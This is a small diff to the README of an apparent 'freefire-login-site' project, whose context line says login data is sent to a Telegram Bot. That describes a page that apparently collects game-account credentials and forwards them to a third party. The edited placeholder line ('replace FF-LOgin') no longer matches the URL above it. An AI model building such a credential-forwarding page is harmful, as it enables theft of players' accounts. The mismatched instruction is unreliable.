@@ -20,7 +20,7 @@ The login data is sent to a **Telegram Bot** via the Bot API — perfect to lear
 
 > https://your-username.github.io/freefire-login-site/
 
-*(replace `your-username` with your GitHub username)*
+*(replace `FF-LOgin` with your GitHub username)*
 
 ---
 
